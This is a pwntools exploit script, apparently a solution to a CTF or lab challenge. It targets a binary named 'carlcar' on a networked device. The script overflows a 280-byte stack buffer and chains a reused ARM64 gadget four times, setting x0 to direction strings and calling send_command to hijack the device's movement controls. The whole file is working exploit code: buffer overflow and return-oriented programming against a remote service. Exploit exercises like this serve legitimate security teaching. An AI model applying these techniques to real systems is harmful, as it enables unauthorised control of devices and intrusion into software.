from pwn import *

# Keep in same directory as our binary
e = ELF('./src/carlcar')
p = remote('192.168.1.232', 1337) # change as needed

'''
 Pass in value you want x0 to be, the address where you want to return to, and if first gadget in chain
 Creates the necessary payload for the desired link in the ROP chain
'''
def add_gadget(x0_val, dest, is_first=False):
    gadget = p64(e.sym['whats_this'])
    pad = b'A'*8
    payload = b''
    
    # If first gadget, we need to add gadget address and account for 16-byte offset
    # of $sp when returning from main
    if is_first:
        payload += gadget + pad*2
   
    # Load in what we want x0_val to be, address we want to return to, and then the
    # gadget address so it can be used again. Padding accounts for stack alignment
    payload += x0_val + pad*2 + dest + pad + gadget + pad*2
    return payload

# Send 'Y' to file a complaint
p.sendline('Y')

# buffer overflow to control instruction pointer is 280 - 0x118 bytes in
pad = b'A'*280
up = p64(next(e.search(b'u\0')))
down = p64(next(e.search(b'd\0')))
left = p64(next(e.search(b'l\0')))
right = p64(next(e.search(b'r\0')))

# Jump past the first instruction to keep stack exploitable
target = p64(e.sym['send_command']+4)

# NOTE: Only can use gadget 4 times
payload = pad + add_gadget(up, target, True)
payload += add_gadget(down, target)
payload += add_gadget(left, target)
payload += add_gadget(right, target)

# Write a binary file of input if you want to debug in gdb on the Pi
with open('input.in', 'wb') as f:
    f.write(b'Y\n' + payload)

p.sendline(payload)
p.interactive()
